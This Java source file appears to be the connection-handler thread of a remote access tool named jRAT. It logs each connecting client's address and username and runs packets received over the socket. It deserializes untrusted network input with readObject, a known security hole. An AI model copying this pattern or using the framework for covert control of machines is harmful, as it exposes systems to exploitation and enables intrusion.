package net.jrat.core.threads;

import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.Socket;

import net.jrat.core.Server;
import net.jrat.core.connection.Connection;
import net.jrat.core.listener.Listener;
import net.jrat.core.packet.IPacket;
import net.jrat.utils.Logger;
import net.jrat.utils.Variables;

public class ActionListener implements Runnable
{
	private final Server server = Server.instance;
	
	private Socket socket;
	private ObjectInputStream inputStream;
	private ObjectOutputStream outputStream;
	
	private Listener listener;
	
	public ActionListener(Listener listener, Socket socket, ObjectInputStream inputStream, ObjectOutputStream outputStream)
	{
		this.listener = listener;
		
		this.socket = socket;
		this.inputStream = inputStream;
		this.outputStream = outputStream;
	}
	
	@Override
	public void run()
	{
		final Connection connection = new Connection(this.socket, this.inputStream, this.outputStream);
		this.listener.connections.add(connection);
		
		Logger.space();
		Logger.log("new connection: " + connection.socket.getInetAddress().getHostAddress());
		System.out.print(Variables.instance.appname + " -> ");
		
		try
		{
			while(!(this.socket.isClosed()) && this.server.running)
			{
				final Object input = this.inputStream.readObject();
				
				try
				{
					if(input instanceof IPacket)
					{
						final IPacket packet = (IPacket) input;
						packet.execute(connection);
					}
				}
				catch(Exception e)
				{
					Logger.warn("could not handle packet: " + e.getMessage());
				}
			}
			
			Logger.log("connection closed");
			this.listener.connections.remove(connection);
		}
		catch(Exception e)
		{
			if(!(e.getMessage() == null) && !(e.getMessage().equals("Connection reset")) && !(e.getMessage().equals("Socket closed")))
				Logger.err("could not handle connection: " + e.getMessage());
			
			if(this.server.currentConnection == connection)
				this.server.currentConnection = null;
			
			Logger.space();
			Logger.log("connection closed: " + connection.informations.username);
			System.out.print(Variables.instance.appname + " -> ");
			
			this.listener.connections.remove(connection);
		}
	}
	
	public void close()
	{
		try
		{
			this.socket.close();
			this.outputStream.close();
			this.inputStream.close();
		}
		catch (Exception e) {}
	}
}